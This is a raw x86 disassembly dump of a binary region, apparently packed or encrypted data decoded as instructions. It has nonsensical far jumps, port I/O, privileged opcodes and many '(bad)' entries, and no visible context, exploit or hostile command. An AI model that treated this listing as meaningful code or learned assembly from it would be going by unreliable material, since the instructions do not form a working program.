  4237c0:	or     ebx,DWORD PTR [edx]
  4237c2:	movzx  ecx,WORD PTR [edi]
  4237c5:	mov    ebp,0x41684018
  4237ca:	jmp    0xa5d79a6f
  4237cf:	jmp    0x33a8:0x920a986d
  4237d6:	popa   
  4237d7:	outs   dx,BYTE PTR ds:[esi]
  4237d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d9:	push   ds
  4237da:	and    dh,0xdd
  4237dd:	jl     0x4237bb
  4237df:	into   
  4237e0:	call   0xc84e:0xd7bba9ee
  4237e7:	out    0x6e,al
  4237e9:	pop    es
  4237ea:	push   0xffffffd7
  4237ec:	stc    
  4237ed:	xor    DWORD PTR [ebx],edi
  4237ef:	fiadd  WORD PTR ds:0x17729542
  4237f5:	pusha  
  4237f6:	inc    ebp
  4237f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237f8:	addr16 int 0xd4
  4237fb:	sub    bh,cl
  4237fd:	mov    edi,cs
  4237ff:	aam    0x15
  423801:	loop   0x4237a4
  423803:	dec    esp
  423804:	arpl   WORD PTR [ebp-0x169ea487],ax
  42380a:	mov    dl,0xaa
  42380c:	sbb    BYTE PTR [ebp+ebp*2-0x69],dl
  423810:	ins    DWORD PTR es:[edi],dx
  423811:	xchg   esi,eax
  423812:	call   ebp
  423814:	or     BYTE PTR [eax+0x56d569f0],ch
  42381a:	test   al,0xd6
  42381c:	dec    ebp
  42381d:	mov    eax,0x812f1d3d
  423822:	jecxz  0x4237f8
  423824:	mov    BYTE PTR [ebx],bl
  423826:	sub    ebx,DWORD PTR ds:0xb78de8af
  42382c:	jge    0x4237ce
  42382e:	jl     0x4237d0
  423830:	nop
  423831:	sub    ah,0x61
  423834:	nop
  423835:	jbe    0x423851
  423837:	jne    0x423890
  423839:	in     eax,dx
  42383a:	adc    eax,0xe682f1a4
  42383f:	dec    esi
  423841:	mov    cl,0x9a
  423843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423844:	mov    DWORD PTR [ebp-0x42],esp
  423847:	pop    edx
  423848:	xchg   DWORD PTR [ebx+0x1e],esi
  42384b:	repz push 0x7aea5f1b
  423851:	jmp    0xb921b5b0
  423856:	ret    0xab3d
  423859:	sbb    BYTE PTR [ecx-0x7f8d1ed6],dl
  42385f:	cmc    
  423860:	int3   
  423861:	mov    al,0x89
  423863:	inc    edx
  423864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423865:	aas    
  423866:	pop    ecx
  423867:	cdq    
  423868:	mov    esp,0x75833a64
  42386d:	push   esp
  42386f:	lods   eax,DWORD PTR ds:[esi]
  423870:	push   0x23506eaf
  423875:	xor    ecx,eax
  423877:	fld    QWORD PTR [edx+edi*1+0x55]
  42387b:	mov    ebx,gs
  42387d:	fwait
  42387e:	call   0xb00b:0x978169d2
  423885:	bound  eax,QWORD PTR [edx]
  423887:	fisttp WORD PTR [ebx+0x33]
  42388a:	(bad)  
  42388b:	aas    
  42388c:	add    BYTE PTR [esi+0x4e188b90],dh
  423892:	aaa    
  423893:	es or  al,0x3e
  423896:	sti    
  423897:	jmp    0xc34b:0x2e1298c0
  42389e:	dec    edx
  42389f:	fs out dx,al
  4238a1:	cmp    al,0x22
  4238a3:	mov    eax,0x9a18a7fb
  4238a8:	or     BYTE PTR [ebp-0x17],bh
  4238ab:	int    0x67
  4238ad:	mov    ebx,0x3cecafd8
  4238b2:	test   DWORD PTR [edx-0x10],eax
	...
  423915:	add    BYTE PTR [edx-0x770e5c],cl
  42391b:	(bad)  
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    esi,esp
  423923:	add    eax,0x7a7e3978
  423928:	add    DWORD PTR [eax],eax
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    BYTE PTR [ebx],dl
  42392f:	xor    dh,BYTE PTR ds:[esi-0x56]
  423933:	push   cs
  423934:	mov    cl,0xf
  423936:	jae    0x6b3afab1
  42393c:	loopne 0x423903
  42393e:	adc    BYTE PTR [esi+0x69],al
  423941:	jmp    0xad3f:0x53a9b06a
  423948:	popf   
  423949:	fwait
  42394a:	pop    ss
  42394b:	loopne 0x42398f
  42394d:	pop    ss
  42394e:	popf   
  42394f:	aad    0xba
  423951:	mov    esp,0x6b8839a6
  423956:	add    BYTE PTR [edi-0x69],al
  423959:	add    edx,ebp
  42395b:	bound  ebp,QWORD PTR [edi]
  42395d:	push   cs
  42395e:	xchg   edx,eax
  42395f:	pop    ebx
  423960:	je     0x4239a2
  423962:	fs jne 0x423985
  423965:	dec    edx
  423966:	mov    eax,0x40ee0da0
  42396b:	fs scas eax,DWORD PTR es:[edi]
  42396d:	ins    DWORD PTR es:[edi],dx
  42396e:	mov    WORD PTR [edx+0x1cf752d1],?
  423974:	sub    esp,esi
  423976:	shl    ebp,1
  423978:	jecxz  0x4239f3
  42397a:	mov    bh,0xcc
  42397c:	cmp    ebp,DWORD PTR [ecx-0x1d54058b]
  423982:	sub    BYTE PTR [edi+0x1d],0xec
  423986:	or     edx,DWORD PTR [edi]
  423988:	es mov dh,0x1f
  42398b:	test   eax,0xa252b179
  423990:	push   es
  423991:	icebp  
  423992:	lea    ebx,[ebx+0x59]
  423995:	ror    BYTE PTR [ebx-0x5edb9],0xbf
  42399c:	shl    BYTE PTR [edi+0x5771afdc],1
  4239a2:	pop    edi
  4239a4:	mov    esp,0xc93e2aaa
  4239a9:	mov    WORD PTR [ebx],gs
  4239ab:	aad    0xbf
  4239ad:	cwde   
  4239ae:	loopne 0x4239f4
  4239b0:	jne    0x423935
  4239b2:	fcomp  QWORD PTR [edi]
  4239b4:	push   ebx
  4239b5:	dec    esi
  4239b6:	xchg   esp,eax
  4239b7:	ror    DWORD PTR ds:0x9e6cb8bb,1
  4239bd:	fild   WORD PTR [edx-0x31da7700]
  4239c3:	jmp    0x64295c37
  4239c8:	push   cs
  4239c9:	repz lahf 
  4239cb:	push   cs
  4239cc:	div    DWORD PTR [edx+0x70]
  4239cf:	sbb    edx,DWORD PTR [ebx+ebp*1+0x3c8a567e]
  4239d6:	or     BYTE PTR [esi+0x1c4f2947],0xf
  4239dd:	and    BYTE PTR [edi],dl
  4239df:	int    0x36
  4239e1:	xor    DWORD PTR [edi],esi
  4239e3:	loopne 0x4239f0
  4239e5:	inc    edi
  4239e6:	(bad)  
  4239e7:	xchg   ecx,eax
  4239e8:	scas   eax,DWORD PTR es:[edi]
  4239e9:	push   eax
  4239ea:	inc    esi
  4239eb:	nop
  4239ec:	adc    ebx,DWORD PTR [eax+0x5f]
  4239ef:	bnd jmp 0x4239d3
  4239f2:	scas   eax,DWORD PTR es:[edi]
  4239f3:	jae    0x42399b
  4239f5:	cmp    DWORD PTR [ebp+0xb],esp
  4239f8:	xor    DWORD PTR [eax],0x41
  4239fb:	lods   al,BYTE PTR fs:[esi]
  4239fd:	mov    WORD PTR [eax+0x6e],cs
  423a00:	dec    esp
  423a01:	xchg   edi,eax
  423a02:	sub    dl,dh
  423a04:	popa   
  423a05:	fiadd  DWORD PTR [edx]
  423a07:	push   esi
  423a08:	mov    esp,0x262622f1
  423a0d:	add    bl,BYTE PTR [eax+0x3c]
  423a10:	mov    ch,0xb0
  423a12:	sbb    DWORD PTR [edx],ebx
  423a14:	mov    al,0x4
  423a16:	and    BYTE PTR [ebp-0x75],0x29
  423a1a:	add    edx,esp
  423a1c:	iret   
  423a1d:	xchg   edx,eax
  423a1e:	mov    ds,WORD PTR [eax-0x37]
  423a21:	push   0x35d7327f
  423a26:	(bad)  
  423a27:	in     eax,0xbf
  423a29:	push   edi
  423a2a:	pushf  
  423a2b:	mov    WORD PTR [edi+0x21],gs
  423a2e:	imul   ah
  423a30:	jbe    0x4239e8
  423a32:	inc    esi
  423a33:	pop    eax
  423a34:	popf   
	...
  423a95:	add    BYTE PTR [eax],dh
  423a97:	cmp    eax,0xdf7d9f75
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	push   esp
  423aa3:	jg     0x423a92
  423aa5:	sahf   
  423aa6:	test   DWORD PTR [ebx+0x1],edi
  423aa9:	add    BYTE PTR [edi],al
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [eax],bh
  423aaf:	cli    
  423ab0:	ins    DWORD PTR es:[edi],dx
  423ab1:	jns    0x423a59
  423ab3:	xor    BYTE PTR [ebx-0x61ea338d],dl
  423ab9:	dec    esi
  423aba:	sbb    BYTE PTR [eax-0x79e0cdef],bl
  423ac0:	int    0x84
  423ac2:	repnz test DWORD PTR [ebp-0xc],esi
  423ac6:	les    ecx,FWORD PTR [edx+0x50264d8b]
  423acc:	cmp    eax,0x3897113e
  423ad1:	xor    DWORD PTR [ebx],0x5e
  423ad4:	mov    esp,0x7f0469d1
  423ad9:	jp     0x423b36
  423adb:	adc    eax,0x465a2938
  423ae0:	jnp    0x423afe
  423ae2:	stos   DWORD PTR es:[edi],eax
  423ae3:	syscall 
  423ae5:	or     eax,0xb41e2c34
  423aea:	fcom   DWORD PTR [eax-0x54073e61]
  423af0:	pop    esp
  423af1:	mov    eax,ss:0x2811df72
  423af7:	push   0x740ea066
  423afc:	enter  0xb28a,0x0
  423b00:	repz push esi
  423b02:	loope  0x423b55
  423b04:	fld    st(0)
  423b06:	jecxz  0x423b4c
  423b08:	rol    cl,0xca
  423b0b:	(bad)  
  423b0d:	cld    
  423b0e:	or     BYTE PTR [ebx-0x23],0x16
  423b12:	popf   
  423b13:	out    dx,eax
  423b14:	dec    ebp
  423b15:	outs   dx,BYTE PTR ds:[esi]
  423b16:	sub    BYTE PTR [edi],cl
  423b18:	stc    
  423b19:	push   esp
  423b1a:	jg     0x423b44
  423b1c:	mov    ds:0x34ac165d,eax
  423b21:	sub    al,0x15
  423b23:	adc    ebx,DWORD PTR gs:[esi]
  423b26:	test   al,0x56
  423b28:	mov    ds:0x251ae881,eax
  423b2d:	les    ebx,FWORD PTR [edi-0x31391d89]
  423b33:	cli    
  423b34:	jecxz  0x423b15
  423b36:	loopne 0x423ac2
  423b38:	pop    ds
  423b39:	mov    dl,0x51
  423b3b:	fdiv   QWORD PTR [esi]
  423b3d:	(bad)  
  423b3f:	ins    BYTE PTR es:[edi],dx
  423b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b41:	mov    edi,0xbb274e89
  423b46:	push   ebp
  423b47:	popa   
  423b48:	mov    bl,dl
  423b4a:	imul   esp,DWORD PTR [edi],0xffffff9f
  423b4d:	out    dx,al
  423b4e:	add    BYTE PTR [eax-0x35],0xae
  423b52:	mov    edx,0x4a9e1c27
  423b57:	pop    es
  423b58:	arpl   WORD PTR [ebp+0x2d],ax
  423b5b:	das    
  423b5c:	aaa    
  423b5d:	out    dx,eax
  423b5e:	push   esi
  423b5f:	and    ecx,esi
  423b61:	aad    0xee
  423b63:	into   
  423b64:	jp     0x423b65
  423b66:	push   ebp
  423b68:	jmp    0xc9913762
  423b6d:	adc    ebx,DWORD PTR [ecx-0x12]
  423b70:	icebp  
  423b71:	xchg   ebp,eax
  423b72:	dec    esi
  423b73:	daa    
  423b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b75:	cmp    eax,0xa005fe87
  423b7a:	sbb    BYTE PTR [ebx-0xe2f5b99],0xb9
  423b81:	popf   
  423b82:	mov    ebp,DWORD PTR [eax-0x2f]
  423b85:	in     eax,0x23
  423b87:	jne    0x423b66
  423b89:	cwde   
  423b8a:	xor    DWORD PTR [eax+0x44],ecx
  423b8d:	mov    ebx,0x5d3a7b75
  423b92:	outs   dx,BYTE PTR ds:[esi]
  423b93:	jae    0x423c09
  423b95:	mov    edx,0x1febe3d3
  423b9a:	call   0xe8f4:0xc24d99c
  423ba1:	int    0xd3
  423ba3:	inc    eax
  423ba4:	fdiv   DWORD PTR [ecx]
  423ba6:	push   eax
  423ba7:	sub    eax,0xde76dd31
  423bac:	and    dh,0x3e
  423baf:	cli    
  423bb0:	call   0x816bc6c4
	...
  423c15:	add    ch,bh
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	imul   esp,DWORD PTR [edi+0x7d],0x17c8c5d
  423c29:	add    BYTE PTR [edi],al
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    BYTE PTR [ebp+0x14],al
  423c30:	pop    ss
  423c31:	pop    ecx
  423c32:	scas   al,BYTE PTR es:[edi]
  423c33:	jns    0x423c20
  423c35:	adc    BYTE PTR [ebp-0x48],bl
  423c38:	pandn  mm7,QWORD PTR [ecx+0x19]
  423c3c:	mov    bl,0x40
  423c3e:	mov    al,ds:0xeddfab19
  423c43:	fmul   QWORD PTR [ebx]
  423c45:	mov    bh,0x7f
  423c47:	jo     0x423c7f
  423c49:	stos   DWORD PTR es:[edi],eax
  423c4a:	mov    cl,0x7c
  423c4c:	pop    ecx
  423c4d:	jnp    0x423c82
  423c4f:	push   ecx
  423c50:	in     al,dx
  423c51:	mov    bl,0xa7
  423c53:	in     al,dx
  423c54:	push   ds
  423c55:	call   0x230f:0x1bacca2
  423c5c:	out    dx,al
  423c5d:	sbb    esi,DWORD PTR [ebp+0x4]
  423c60:	lock fwait
  423c62:	xchg   ebx,eax
  423c63:	xchg   si,ax
  423c65:	int3   
  423c66:	xchg   ebx,eax
  423c67:	jg     0x423cb9
  423c69:	mov    ebx,0xc84a8a90
  423c6e:	jnp    0x423c6f
  423c70:	adc    DWORD PTR [ebx+0x3e445176],0x47
  423c77:	call   0x8b9:0xfef6fd7e
  423c7e:	test   bh,dl
  423c80:	mov    ebx,0xeb415a02
  423c85:	out    dx,al
  423c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c87:	push   ds
  423c88:	pop    eax
  423c89:	push   0x8314ad2f
  423c8e:	(bad)  
  423c8f:	push   0x65d98082
  423c94:	sbb    esp,DWORD PTR [edx+0x18811bf]
  423c9a:	and    BYTE PTR [edx],0xb4
  423c9d:	sub    BYTE PTR [eax],bh
  423c9f:	ins    BYTE PTR es:[edi],dx
  423ca0:	dec    ebp
  423ca1:	nop
  423ca2:	outs   dx,BYTE PTR ds:[esi]
  423ca3:	push   edx
  423ca4:	cs jg  0x423cde
  423ca7:	and    al,0x8e
  423ca9:	or     eax,esi
  423cab:	jb     0x423cd9
  423cad:	fld    QWORD PTR [edi+eax*2]
  423cb0:	sbb    DWORD PTR [eax-0x20f95896],0xdb825be3
  423cba:	push   eax
  423cbb:	pushf  
  423cbc:	push   cs
  423cbd:	mov    ecx,0x6f37ea67
  423cc2:	dec    esi
  423cc3:	fcmovbe st,st(2)
  423cc5:	ds js  0x423c85
  423cc8:	push   0xfd9f3e4a
  423ccd:	and    eax,DWORD PTR [ecx]
  423ccf:	pop    ss
  423cd0:	sahf   
  423cd1:	adc    al,0xcf
  423cd3:	pusha  
  423cd4:	lock outs dx,BYTE PTR ds:[esi]
  423cd6:	ss jb  0x423c7a
  423cd9:	and    bh,BYTE PTR [ebp+0x12]
  423cdc:	ja     0x423ca5
  423cde:	icebp  
  423cdf:	mov    eax,0xd3051bee
  423ce4:	nop
  423ce5:	(bad)  
  423ce6:	int    0xa2
  423ce8:	fnstcw WORD PTR [ebp+0x5a]
  423ceb:	fdiv   st,st(2)
  423ced:	jle    0x423d17
  423cef:	mov    al,ds:0x3517b272
  423cf4:	loopne 0x423d29
  423cf6:	inc    ecx
  423cf7:	fnsave [eax+0x162ce39d]
  423cfd:	je     0x423ca1
  423cff:	mov    ebx,0xcc81947a
  423d04:	cmp    eax,0x5e78e48f
  423d09:	cld    
  423d0a:	add    ebx,eax
  423d0c:	ss pop ss
  423d0e:	and    DWORD PTR [edx],esp
  423d10:	out    0xff,eax
  423d12:	sub    eax,DWORD PTR [esi-0x4]
  423d15:	fidivr DWORD PTR ds:0xa85fb62
  423d1b:	mov    ebp,0xe0e37c93
  423d20:	cdq    
  423d21:	jmp    0x423d70
  423d23:	or     bh,BYTE PTR [ecx-0x2b]
  423d26:	pop    ebp
  423d27:	dec    edi
  423d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d29:	test   al,0x37
  423d2b:	jb     0x423d52
  423d2d:	ret    
  423d2e:	xchg   ecx,eax
  423d2f:	and    al,0x3b
  423d31:	push   edi
  423d32:	cmp    al,0xa1
  423d34:	push   ecx
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	test   eax,0x93fb33ce
  423da7:	jge    0x423daa
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [ebp+0x42ca1206],bh
  423db3:	ret    0x2e61
  423db6:	jae    0x423e25
  423db8:	cmp    BYTE PTR [eax-0x37],ch
  423dbb:	xor    bl,BYTE PTR [eax-0x3223168d]
  423dc1:	mov    dh,0xc7
  423dc3:	pop    ss
  423dc4:	fs loope 0x423da2
  423dc7:	fs push ebp
  423dc9:	sub    ch,BYTE PTR [ebx]
  423dcb:	pop    esi
  423dcc:	inc    edi
  423dcd:	and    edi,DWORD PTR [ebx+0x6a]
  423dd0:	mov    ebp,0x37b3086a
  423dd5:	outs   dx,BYTE PTR ds:[esi]
  423dd6:	hlt    
  423dd7:	js     0x423d7c
  423dd9:	and    bl,dh
  423ddb:	std    
  423ddc:	jns    0x423e0f
  423dde:	icebp  
  423ddf:	rol    BYTE PTR [ebx],cl
  423de1:	or     al,0xb0
  423de3:	mov    ah,0x44
  423de5:	sub    BYTE PTR [edx-0x77],cl
  423de8:	push   cs
  423de9:	lahf   
  423dea:	mov    eax,0xbd07bf27
  423def:	adc    ch,al
  423df1:	mov    al,ds:0x8d87ead3
  423df6:	mov    bl,0xc3
  423df8:	inc    edx
  423df9:	test   al,bl
  423dfb:	clc    
  423dfc:	jae    0x423dfb
  423dfe:	cwde   
  423dff:	dec    edi
  423e00:	push   eax
  423e01:	sti    
  423e02:	aam    0xad
  423e04:	div    dl
  423e06:	lds    eax,FWORD PTR [ecx]
  423e08:	not    DWORD PTR ds:0x8817561a
  423e0e:	dec    edx
  423e0f:	jmp    0xc68d:0x5df35d9a
  423e16:	stos   BYTE PTR es:[edi],al
  423e17:	mov    DWORD PTR [ebx-0x4a4a0b4],0x76773f1b
  423e21:	jae    0x423e73
  423e23:	jns    0x423e47
  423e25:	imul   ebp,DWORD PTR [esi],0x12
  423e28:	cmp    eax,0x1feaea32
  423e2d:	or     BYTE PTR [ecx+0x34c6d6f3],ah
  423e33:	jg     0x423de6
  423e35:	inc    ecx
  423e36:	adc    DWORD PTR [eax-0x1b21fb29],0x497c6357
  423e40:	sbb    DWORD PTR [edi-0x3ddd251f],ecx
  423e46:	xor    DWORD PTR [edx-0x4b60695b],0xffffffbf
  423e4d:	sub    bl,BYTE PTR [ebp-0x37029ba1]
  423e53:	mov    esp,0x30af0552
  423e58:	call   0xad17:0x28b66a9a
  423e5f:	push   eax
  423e60:	mov    al,ds:0x6366cd55
  423e65:	pop    ecx
  423e66:	push   eax
  423e67:	sbb    BYTE PTR ss:[edx+0x58f58e83],ah
  423e6e:	pushf  
  423e6f:	stos   BYTE PTR es:[edi],al
  423e70:	es sti 
  423e72:	push   edx
  423e73:	in     eax,dx
  423e74:	mov    ds:0x7c602a92,eax
  423e79:	shl    BYTE PTR [edx],1
  423e7b:	int3   
  423e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e7d:	test   al,0x87
  423e7f:	in     eax,dx
  423e80:	xchg   esp,eax
  423e81:	adc    DWORD PTR [eax+0x21],esp
  423e84:	ins    DWORD PTR es:[edi],dx
  423e85:	pop    ss
  423e86:	dec    edx
  423e87:	mov    BYTE PTR [eax],dh
  423e89:	arpl   WORD PTR [edx],cx
  423e8b:	pop    esi
  423e8c:	adc    eax,0x190e3f38
  423e91:	mov    bl,0x72
  423e93:	rcl    BYTE PTR [esi-0x52a7f709],0x19
  423e9a:	pop    ss
  423e9b:	mov    es,WORD PTR ds:0x9db9b629
  423ea1:	xor    al,0xca
  423ea3:	ret    0x34a1
  423ea6:	mov    ds:0x6bc4c52a,al
  423eab:	push   edi
  423eac:	jns    0x423eac
  423eae:	jecxz  0x423eb7
  423eb0:	push   ebp
  423eb1:	(bad)
  423eb4:	add    eax,DWORD PTR [eax]
	...
  423f16:	scas   al,BYTE PTR es:[edi]
  423f17:	call   0x9fff:0xff74b964
  423f1e:	xor    ebp,esi
  423f20:	xchg   BYTE PTR [eax-0x2d],dl
  423f23:	mov    edx,0x7e9ae0af
  423f28:	add    DWORD PTR [eax],eax
  423f2a:	pop    es
  423f2b:	add    DWORD PTR [eax],eax
  423f2d:	add    BYTE PTR [esi-0x7b4b1837],al
  423f33:	dec    edi
  423f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f35:	(bad)  
  423f36:	push   ss
  423f37:	xor    DWORD PTR [esi+0x54],edi
  423f3a:	or     BYTE PTR [edi],ch
  423f3c:	sbb    DWORD PTR [ebx+eiz*8],ebp
  423f3f:	fs cs push ecx
  423f42:	out    0xb3,eax
  423f44:	adc    al,0x67
  423f46:	stos   BYTE PTR es:[edi],al
  423f47:	xchg   edi,eax
  423f48:	(bad)  
  423f49:	jmp    0x9f2:0xde4e1d23
  423f50:	je     0x423eea
  423f52:	shl    BYTE PTR [ebx*1+0x1a37ce80],0x4b
  423f5a:	adc    BYTE PTR [ebp-0x25],bl
  423f5d:	aaa    
  423f5e:	jne    0x423fa1
  423f60:	je     0x423f64
  423f62:	cwde   
  423f63:	cmc    
  423f64:	das    
  423f65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f66:	sbb    eax,0xbb7c5d9e
  423f6b:	inc    esp
  423f6c:	sub    al,0xb5
  423f6e:	repz mov ecx,0x1a16a9ec
  423f74:	mov    al,0xd5
  423f76:	push   edx
  423f77:	fwait
  423f78:	outs   dx,DWORD PTR ds:[esi]
  423f79:	shl    BYTE PTR [eax+0x47],cl
  423f7c:	test   eax,0x448b00ac
  423f81:	mov    ?,WORD PTR [edx-0x1c1bdbf0]
  423f87:	adc    al,0x88
  423f89:	(bad)  
  423f8a:	cmp    bl,BYTE PTR [ecx-0x1e]
  423f8d:	mov    ebp,0xbf6908cd
  423f92:	jmp    0xe20b6df3
  423f97:	jno    0x424011
  423f99:	(bad)  
  423f9a:	test   al,0xbe
  423f9c:	addr16 mov ah,0x56
  423f9f:	add    BYTE PTR [eax],al
  423fa1:	inc    ebp
  423fa2:	push   esi
  423fa3:	pop    edx
  423fa4:	pop    es
  423fa5:	(bad)  [esi+0x3136dc17]
  423fab:	push   ds
  423fac:	jg     0x423f72
  423fae:	or     bh,BYTE PTR [esi-0x362f7f38]
  423fb4:	test   eax,0x5244d8e3
  423fb9:	push   ebx
  423fba:	aaa    
  423fbb:	lods   eax,DWORD PTR ds:[esi]
  423fbc:	or     al,dh
  423fbe:	mov    ebp,0x4da24428
  423fc3:	mov    ah,0x2a
  423fc5:	and    BYTE PTR [ecx+0x75a21dc2],dh
  423fcb:	outs   dx,DWORD PTR ds:[esi]
  423fcc:	test   eax,0x9b022fa4
  423fd1:	mov    ecx,0x5e6b68a1
  423fd6:	imul   esi,DWORD PTR [edi+0x7d],0x20da02b4
  423fdd:	xchg   esi,eax
  423fde:	push   es
  423fdf:	retf   
  423fe0:	adc    eax,0x2061c57a
  423fe5:	outs   dx,BYTE PTR ds:[esi]
  423fe6:	xchg   ebp,eax
  423fe7:	lock in al,0x8
  423fea:	js     0x42405a
  423fec:	or     esi,DWORD PTR [ebx+0x329650b8]
  423ff2:	pop    eax
  423ff3:	sbb    al,0xe4
  423ff5:	pusha  
  423ff6:	mov    cl,0x44
  423ff8:	retf   
  423ff9:	test   al,0x9
  423ffb:	dec    ecx
  423ffc:	mov    bh,BYTE PTR [ebp+edx*8+0x32]
  424000:	test   eax,0x8e74eb25
  424005:	dec    esi
  424006:	ja     0x42402d
  424008:	jnp    0x423fce
  42400a:	pop    es
  42400b:	or     BYTE PTR [ebp+0x7ca58e01],cl
  424011:	xor    esi,edi
  424013:	xor    al,0x38
  424015:	and    eax,esp
  424017:	push   ecx
  424018:	popa   
  424019:	nop
  42401a:	mov    ds,WORD PTR [ebx-0x4b]
  42401d:	mov    esi,0xae881738
  424022:	or     edx,DWORD PTR [ecx]
  424024:	sub    BYTE PTR [esi],al
  424026:	stc    
  424027:	pop    ebx
  424028:	(bad)  
  42402a:	sub    bl,bh
  42402c:	dec    edx
  42402d:	neg    edx
  42402f:	retf   0xc02c
  424032:	clc    
  424033:	xor    ah,BYTE PTR [ebx]
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x3b55e30f]
  4240a3:	setae  al
  4240a6:	mov    eax,ds:0x700017f
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [edx],bl
  4240af:	dec    ecx
  4240b0:	stos   DWORD PTR es:[edi],eax
  4240b1:	aam    0xc4
  4240b3:	rcr    BYTE PTR [ecx-0x2800b128],0x28
  4240ba:	mov    cl,0xff
  4240bc:	pop    edx
  4240bd:	lea    esi,[ebx+0x2635aef]
  4240c3:	push   edi
  4240c4:	inc    esp
  4240c5:	mov    ebx,0xa8f19021
  4240ca:	and    BYTE PTR [eax-0x1e],dh
  4240cd:	es pushf 
  4240cf:	test   BYTE PTR [esi+0x27b175be],dl
  4240d5:	adc    DWORD PTR [ecx+eax*4],ecx
  4240d8:	sub    eax,0x4a78034e
  4240dd:	add    eax,0xef5a0b7f
  4240e2:	out    dx,eax
  4240e3:	mov    ds:0xbf33712a,eax
  4240e8:	mov    edx,0xbb283c87
  4240ed:	inc    esi
  4240ee:	fisubr WORD PTR [esi]
  4240f0:	fcom   DWORD PTR [ebx-0x3f85612b]
  4240f6:	or     eax,0x8a24c6b
  4240fb:	push   ebx
  4240fc:	jle    0x424102
  4240fe:	mov    WORD PTR [ebp-0x4],es
  424101:	lods   eax,DWORD PTR ds:[esi]
  424102:	in     al,dx
  424103:	mov    ah,0x7f
  424105:	out    dx,eax
  424106:	daa    
  424107:	mov    al,0xe6
  424109:	jmp    0x424147
  42410b:	aaa    
  42410c:	sub    DWORD PTR [ecx-0x3a],0x2f
  424110:	sbb    eax,0x914567ca
  424115:	(bad)  
  424116:	push   cs
  424117:	outs   dx,DWORD PTR ds:[esi]
  424118:	xchg   esp,eax
  424119:	test   BYTE PTR ds:0x38bcefa3,bh
  42411f:	push   cs
  424120:	cmp    DWORD PTR [edx-0x6f],edx
  424123:	adc    DWORD PTR [ebx+0xa],eax
  424126:	ja     0x42417c
  424128:	dec    ecx
  424129:	mov    ebp,0x4c352d18
  42412e:	pop    esi
  42412f:	test   BYTE PTR [ebx],ah
  424131:	retf   
  424132:	inc    ebx
  424133:	sub    edx,DWORD PTR [edx-0x7a6f1cfa]
  424139:	mov    cl,0x2a
  42413b:	aaa    
  42413c:	dec    esi
  42413d:	or     edi,DWORD PTR [eax-0x4c]
  424140:	fst    st(1)
  424142:	sbb    edx,DWORD PTR [esi-0x737c785b]
  424148:	je     0x424114
  42414a:	repnz and DWORD PTR [ecx+0x7201f22b],edx
  424151:	mov    WORD PTR [ebx-0x21],?
  424154:	dec    edx
  424155:	xchg   esi,eax
  424156:	add    al,0x20
  424158:	mov    edx,0x6c538c65
  42415d:	push   esi
  42415e:	xor    eax,0x4e9bc64d
  424163:	and    al,0x2d
  424165:	adc    ecx,DWORD PTR [ecx-0x6e3a17f5]
  42416b:	enter  0x1369,0x25
  42416f:	jp     0x4241ef
  424171:	aas    
  424172:	pop    edx
  424173:	test   DWORD PTR [edx-0x36],esp
  424176:	cli    
  424177:	add    al,0xb3
  424179:	xchg   esi,eax
  42417a:	loopne 0x4241aa
  42417c:	stc    
  42417d:	mov    cs,WORD PTR [ebx]
  42417f:	(bad)  
  424181:	pop    ss
  424182:	daa    
  424183:	dec    ebp
  424184:	gs inc esp
  424186:	push   ecx
  424187:	push   ds
  424188:	bound  esp,QWORD PTR [esi-0xdc2d373]
  42418e:	sbb    eax,0x271e14c6
  424193:	jle    0x42416b
  424195:	mov    WORD PTR [edi-0x6e43e318],cs
  42419b:	push   0xfffffffc
  42419d:	cld    
  42419e:	mov    al,ds:0xe9562df2
  4241a3:	shr    DWORD PTR [eax],1
  4241a5:	cmp    BYTE PTR [esi],0x66
  4241a8:	rcl    BYTE PTR [esi+0x1c],0xa6
  4241ac:	cmp    al,0x4b
  4241ae:	xchg   esi,eax
  4241af:	dec    ebx
  4241b0:	shl    al,1
  4241b2:	or     al,0xe0
  4241b4:	out    0x0,al
	...
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi+0x13d4b417]
  424223:	xor    eax,edi
  424225:	cmp    ebp,DWORD PTR [eax+0x7000180]
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [eax-0x6b],dl
  424230:	mov    edi,0x2ae18f77
  424235:	push   ecx
  424236:	xchg   edi,eax
  424237:	mov    dl,BYTE PTR [esi]
  424239:	push   0x5b999efe
  42423e:	jo     0x424274
  424240:	aad    0x8f
  424242:	and    DWORD PTR [edx+0xa915022],edx
  424248:	popf   
  424249:	retf   0xb6a9
